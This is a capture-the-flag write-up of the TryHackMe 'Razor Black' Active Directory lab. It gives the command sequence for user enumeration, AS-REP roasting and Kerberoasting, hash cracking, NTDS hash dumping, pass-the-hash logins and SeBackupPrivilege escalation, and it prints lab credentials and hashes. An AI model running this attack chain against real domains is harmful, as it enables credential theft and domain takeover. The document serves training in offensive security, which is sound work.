
# Razor Black

![[attachments/Pasted image 20240515093358.png]]

These guys call themselves hackers. Can you show them who's the boss ??

**Difficulty**: Medium

**Platform**: TryHackMe

**OS**: Windows (Active Directory)

**Category**:

# Task 1: Deploy The Box

Throw something like a rock on the big green thingy on the right side here to deploy your box.

The box has ICMP enabled. So, look at ping first before starting recon and stop slapping `-Pn` on nmap.  

This room is proudly made by: [Xyan1d3](https://twitter.com/xyan1d3)

Every solver of this box will get a free cookie when completing this box.  

If you enjoy this room, please let me know by tagging me on Twitter. You may also contact me in case of some unintended routes or bugs, and I will be happy to resolve them. Also, let me know which part you enjoyed and which part made you struggle.

![[attachments/Pasted image 20240515093631.png]]

We are good to go ✅

NOTE: This machine kept dying a lot so i had to reset multiple times which is why you will notice different IP addresses. Just know they all point to the same target `raz0rblack.thm`
# Task 2: Flag Submission Panel

This will test your Active Directory enumeration and exploitation knowledge.  
  
Submit your flags and answers to prove your progression.

**Answer the questions below**

# What is the Domain Name?

Nmap Scan result:

Syntax:

```shell
nmap -sCV -A -p- -T4 --min-rate=1000 10.10.13.150 -oN scan -vv
```

```shell
# Nmap 7.94SVN scan initiated Wed May 15 09:37:28 2024 as: nmap -sCV -A -p- -T4 --min-rate=1000 -oN scan -vv 10.10.13.150
Increasing send delay for 10.10.13.150 from 0 to 5 due to 72 out of 179 dropped probes since last increase.
Warning: 10.10.13.150 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.13.150
Host is up, received conn-refused (0.14s latency).
Scanned at 2024-05-15 09:37:29 WAT for 269s
Not shown: 65481 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       REASON      VERSION
53/tcp    open     domain        syn-ack     Simple DNS Plus
88/tcp    open     kerberos-sec  syn-ack     Microsoft Windows Kerberos (server time: 2024-05-15 08:39:07Z)
111/tcp   open     rpcbind       syn-ack     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack     Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack
464/tcp   open     kpasswd5?     syn-ack
593/tcp   open     ncacn_http    syn-ack     Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack
723/tcp   filtered omfs          no-response
2049/tcp  open     nlockmgr      syn-ack     1-4 (RPC #100021)
3268/tcp  open     ldap          syn-ack     Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped    syn-ack
3389/tcp  open     ms-wbt-server syn-ack     Microsoft Terminal Services
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Issuer: commonName=HAVEN-DC.raz0rblack.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-14T08:36:24
| Not valid after:  2024-11-13T08:36:24
| MD5:   f519:b3ea:9e95:cdde:60be:faa2:feda:daa8
| SHA-1: a81b:10ed:e9f1:6dc6:25c7:c484:7106:38a2:ad75:7ee0
| -----BEGIN CERTIFICATE-----
| MIIC8jCCAdqgAwIBAgIQH8I9k+oeh7ZIJpuJ6xcegjANBgkqhkiG9w0BAQsFADAi
| MSAwHgYDVQQDExdIQVZFTi1EQy5yYXowcmJsYWNrLnRobTAeFw0yNDA1MTQwODM2
| MjRaFw0yNDExMTMwODM2MjRaMCIxIDAeBgNVBAMTF0hBVkVOLURDLnJhejByYmxh
| Y2sudGhtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtSRGER557lXN
| uXCQcqBE64ItIWLF2K2AWRbdxwXYKbHFcbeiimp3zw6C891XZYrnmhoIRUF9P8CD
| xOtbuTC7mB1mwfSAcHjFk8Ns3B1nhrTBlsFS1UGZ2UQtV+CI5xuks+BXBDs2gZ1W
| UW6rHvP10M7KcmrvKgbTFBB6kLHIRYkgqKUQjCixfJJ0axF+LPhqcXT9uAF1MWGT
| HR8pbcTnsg7r5zqwLgP9zJ0gv81No7BMpuligdOSF6fbYpdvQgmpSXLuMqnhGaP3
| WMu7ZZS4k14NxcM5/JhX7w/z6mlwTHBtAesE4/Xm1y+Qdwvu54oT8Nd42b7lTBPR
| vt2/cC3d+QIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
| BDAwDQYJKoZIhvcNAQELBQADggEBAE3tLrvf/tIehFGH+kofWYTKMuNMAo7lbYVD
| cK9cjGmPuY4+odKmGq4QztJLq2+CBiuQ3WiFmLaMsHO82wAjueSEV5EAmHiJNy5I
| G9g7ZIFRrWAREqmLx/iebjfe0Zu6fgeqaeTg7NM+zS5myqNLiomPAcsCFb3fimpi
| 2nTten1zFUfRfzwzmr6pQYS+mDVHMlFFNQe9PnDi9+8v8mR2x2jsa877XSQQH0Di
| dL1VVb+MuD+vMOawCi6hKbmqFlwJLcRCtNZM8k2AJ3RHRfrxqNKha5lar/3++7Yx
| QMug9LusV4/pkhGv9ep4/zHsl+jw6xJU7SEJAcKrqpm/RxzgmZM=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-05-15T08:40:07+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-15T08:39:58+00:00
4326/tcp  filtered geognosis     no-response
5985/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        syn-ack     .NET Message Framing
10860/tcp filtered helix         no-response
11644/tcp filtered unknown       no-response
17305/tcp filtered unknown       no-response
24823/tcp filtered unknown       no-response
26469/tcp filtered unknown       no-response
28315/tcp filtered unknown       no-response
29746/tcp filtered unknown       no-response
30305/tcp filtered unknown       no-response
30922/tcp filtered unknown       no-response
31707/tcp filtered unknown       no-response
36518/tcp filtered unknown       no-response
43348/tcp filtered unknown       no-response
44536/tcp filtered unknown       no-response
47001/tcp open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
48527/tcp filtered unknown       no-response
49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49669/tcp open     ncacn_http    syn-ack     Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49671/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49673/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49677/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49693/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49704/tcp open     msrpc         syn-ack     Microsoft Windows RPC
50078/tcp filtered unknown       no-response
50762/tcp filtered unknown       no-response
50900/tcp filtered unknown       no-response
52212/tcp filtered unknown       no-response
54549/tcp filtered unknown       no-response
54621/tcp filtered unknown       no-response
55011/tcp filtered unknown       no-response
55955/tcp filtered unknown       no-response
56683/tcp filtered unknown       no-response
61388/tcp filtered unknown       no-response
64183/tcp filtered unknown       no-response
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2024-05-15T08:40:02
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21902/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12461/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28426/udp): CLEAN (Timeout)
|   Check 4 (port 10917/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 15 09:41:58 2024 -- 1 IP address (1 host up) scanned in 269.33 seconds
```

Looking at the rdp-ntlm-info we can find the domain name to be `raz0rblack.thm`

Next is to add the entry to out `/etc/hosts` file

![[attachments/Pasted image 20240515094550.png]]

# What is Steven's Flag?

From the nmap scan we can see nfs (Network File System) is running on the target. So we can list share using `showmount`

```shell
showmount -e raz0rblack.thm
```

![[attachments/Pasted image 20240515095642.png]]

Share named users.

We can mount this share using:

```shell
sudo mount -t nfs raz0rblack.thm:'/users' /home/deusx/Tryhackme/razorblack/mnt/
```

First create an mnt directory in your current directory

![[attachments/Pasted image 20240515095738.png]]

Check the contents of the new directory as root and we have the first flag

![[attachments/Pasted image 20240515095851.png]]

# What is the zip file's password?

The Excel sheet contains some names and their respective roles.

![[attachments/Pasted image 20240515100401.png]]

We can use a tool like [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to create a wordlist of possible users for brute forcing later on.

- Copy the names and put in a text file 
- Clone the github repo
- Run the command

```shell
./username-anarchy --input-file ../user.txt > userlist.txt
```

This will create a wordlist of possible username combinations from the names in the specified file `user.txt` then put the result into a file named `userlist.txt`.

With this we have 175 combinations.

![[attachments/Pasted image 20240515103835.png]]

Nmap scan shows Kerberos running on the target.

Using a tool called kerbrute, we can enumerate valid users.

To install kebrute:

- go to this [link](https://github.com/ropnop/kerbrute/releases/tag/v1.0.2) and download this file:

![](https://deusx7.github.io/Posts/THM/Writeups/Attacktive_Directory/attachments/20240117103534.png)

- Open your terminal and navigate to the directory where you downloaded to.
- Run the command `mv kerbrute_linux_amd64 kerbrute`
- Next command `chmod +x kerbrute` to make it an executable
- Now you can run it with `./kerbrute`

```shell
./kerbrute userenum --dc raz0rblack.thm -d raz0rblack.thm userlist.txt
```

![[attachments/Pasted image 20240515105906.png]]

Next up, we can try to retrieve kerberos tickets using a tool `GetNPUsers.py`. This _will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute._

We have 3 accounts that we could use.

Impacket Syntax:

```shell
impacket-GetNPUsers DOMAIN/user -no-pass
```

![[attachments/Pasted image 20240515110508.png]]

We can try another user

![[attachments/Pasted image 20240515110527.png]]

And we have a hash.

Looking at the Hashcat Examples Wiki page, we can see the hash mode is 18200

![](https://deusx7.github.io/Posts/THM/Writeups/Attacktive_Directory/attachments/20240117132833.png)

Put the hash inside a file and use hashcat to crack it.

```shell
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

![[attachments/Pasted image 20240515110836.png]]

And we have a password

![[attachments/Pasted image 20240515110939.png]]

With a valid username and password, we are able to enumerate smb.

```shell
smbclient -L raz0rblack.thm -U twilliams
```

![[attachments/Pasted image 20240515111136.png]]

Trying to connect to each of the share shows the user `twilliams` does not have access to any of the shares.

![[attachments/Pasted image 20240515130916.png]]

This means we won't be able to use a tool like `psexec` to gain access. We can use `crackmapexec` to test for other users

![[attachments/Pasted image 20240515124842.png]]

As seen we don't have access with the user twilliams but we have an error message `STATUS_PASSWORD_MUST_CHANGE` for the user `sbradley`

This means we can change the password of this user

I tried using the `smbpasswd` binary but it wasn't working so i went with the impacket tool

![[attachments/Pasted image 20240515130744.png]]

```shell
impacket-smbpasswd sbradley@raz0rblack.thm
```

The old password is the same as the one we cracked earlier, then enter any new password.

With this we can try to connect to the SMB shares.

![[attachments/Pasted image 20240515130955.png]]

We are able to access the trash share and download all the files using mget

![[attachments/Pasted image 20240515131309.png]]

The zip file refused to download but it worked after i changed up the syntax a little

![[attachments/Pasted image 20240515132000.png]]

The chat log contains a conversation between 2 people bradly and Administrator.

![[attachments/Pasted image 20240515132432.png]]

And it also contains hints to for the room.

The sbradley.txt just contains the same flag we got earlier.

As we can see the zip file is requesting for a password and we have none.

![[attachments/Pasted image 20240515132324.png]]

So we can decide to crack it using john the ripper or fcrackzip

Using fcrackzip we get the zip password

```shell
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt experiment_gone_wrong.zip
```

![[attachments/Pasted image 20240515132719.png]]

# What is Ljudmila's Hash?

Unzip the file

![[attachments/Pasted image 20240515132947.png]]

And just like the chat log said, we have system and ntds.

Next is to dump hashes using secretsdump

![[attachments/Pasted image 20240515134439.png]]

```shell
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL > hashes.txt
```

That's a lot of hashes 

![[attachments/Pasted image 20240515134635.png]]

We can use the following to filter out the NT hash

![[attachments/Pasted image 20240515135927.png]]

Rather than using the previous userlist we obtained earlier, we can extract a much smaller list of users using crackmapexec and grepping for `SidTypeUser`

![[attachments/Pasted image 20240515140450.png]]

```shell
crackmapexec smb raz0rblack.thm -u twilliams -p roastpotatoes --rid-brute | grep SidTypeUser
```

Then edit your file with just these users present

userlist.txt

```
lvetrova
administrator
xyan1d3
sbradley
twilliams
```

ntds.txt

```
1afedc472d0fdfe07cd075d36804efd0
31d6cfe0d16ae931b73c59d7e0c089c0
4ea59b8f64c94ec66ddcfc4e6e5899f9
703a365974d7c3eeb80e11dd27fb0cb3
da3542420eff7cfab8305a68b7da7043
c378739d7c136c1281d06183665702ea
9f73aaafc3b6d62acdbb0b426f302f9e
6a5bad944868142e65ad3049a393e587
b112332330f11267486d21549d326bd5
f9b8c9864aa7bc53405ed45b48ef19ef
efe1e7cd1799ef6dff3c85b36239ef17
4104dd2ede9c241eb18bda7470310d91
d1d85bdc244f5d7185bcff43eea3ab53
361e1f12cb92caf151fc925eaa1b50f4
[..]
```

Now we can use crackmapexec to bruteforce and see which usernames match with which hash.

This is going to take a long time because there are a lot of hashes (1866) that each username will be tested against. So in order to save time you can just rearrange the userlist according to which user you suspect you''ll get a hash for. We already got a password for twilliams and reset the password for sbradley so those 2 should be at the bottom. Administrator would be too easy to get at this stage so you can make it 3rd on your list. The last 2 is `lvetrova` and `xyan1d3`. The former seems to be more likely (based on intuition) so i put it first and the other second.

Now we run crackmapexec

![[attachments/Pasted image 20240515145020.png]]

```shell
crackmapexec smb raz0rblack.thm -u userlist.txt -H ntds.txt
```

And we have a hit in a few seconds for the user `lvetrova`

![[attachments/Pasted image 20240515145113.png]]

# What is Ljudmila's Flag?

With this hash we can authenticate to the machine using `evil-winrm`

![[attachments/Pasted image 20240515150024.png]]

```shell
evil-winrm -i raz0rblack.thm -u lvetrova -H Hash
```

There is a file in the home directory named `lvetrova.xml` that seems to contain the flag in a coded format.

![[attachments/Pasted image 20240515150831.png]]

Using this powershell syntax we can decode the xml string to get the flag

![[attachments/Pasted image 20240515151419.png]]

```powershell
$Credential = Import-Clixml -Path lvetrova.xml
$Credential.GetNetworkCredential().password
```

Next up with the credentials for `lvetrova` we can perform kerberoasting attack using `impacket-GetUserSPNs`

Both users `twilliams` and `lvetrova` can perform this attack but for `lvetrova`, you'll need to double the hash you got earlier NT:NT

```shell
impacket-GetUserSPNs -dc-ip 10.10.13.185 raz0rblack.thm/lvetrova -hashes NT:NT
impacket-GetUserSPNs -dc-ip 10.10.13.185 raz0rblack.thm/twilliams:PASSWORD
```

![[attachments/Pasted image 20240515154738.png]]

Adding the `-request` flag will give us the hash

![[attachments/Pasted image 20240515154917.png]]

```shell
impacket-GetUserSPNs -dc-ip 10.10.13.185 raz0rblack.thm/twilliams:PASSWORD -request
```

Copy the hash and crack using hashcat. The hashcat mode is 13100

![[attachments/Pasted image 20240515155110.png]]

![[attachments/Pasted image 20240515155208.png]]

![[attachments/Pasted image 20240515155234.png]]

Now we can login using `evil-winrm`

![[attachments/Pasted image 20240515155445.png]]

Checking the home directory, there is a message stating the flag is not in the xml file like before

![[attachments/Pasted image 20240515155557.png]]

Cracking it anyway using the same method as before

```powershell
$Credential = Import-Clixml -Path xyan1d3.xml
$Credential.GetNetworkCredential().password
```

They are just trolling lol

![[attachments/Pasted image 20240515155726.png]]

Next is privilege escalation.

Checking our user's privileges with `whoami /all`

![[attachments/Pasted image 20240515165633.png]]

We see that this user have the `SeBackupPrivilege` Enabled.

A quick search on hacktricks gives the steps to take to exploit this [SeBackupPrivilege](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

![[attachments/Pasted image 20240515165756.png]]

We have a number of options here but i'll go with the second link.

![[attachments/Pasted image 20240515165831.png]]

This will take you to a github which has 2 dll files, download them to your machine.

Next is to upload these files, since we are using evil-winrm we can just use the `upload` feature.

![[attachments/Pasted image 20240515170139.png]]

Just for the sake of clarity, currently with our permissions we don't have the permission to copy the root.xml file in the Administrator directory

![[attachments/Pasted image 20240515170405.png]]

But with these 2 cmdlets we just downloaded we will be able to.

Next is to follow the commands in the github repo

![[attachments/Pasted image 20240515170652.png]]

![[attachments/Pasted image 20240515170757.png]]

Now let's try to copy the file using the same syntax as stated:

![[attachments/Pasted image 20240515170830.png]]

![[attachments/Pasted image 20240515170940.png]]

```powershell
Copy-FileSeBackupPrivilege root.xml C:\Users\xyan1d3\Documents\root.xml -Overwrite
```

It works!

![[attachments/Pasted image 20240515171034.png]]

Let's decode it using the same method as we did earlier

```powershell
$Credential = Import-Clixml -Path root.xml
$Credential.GetNetworkCredential().password
```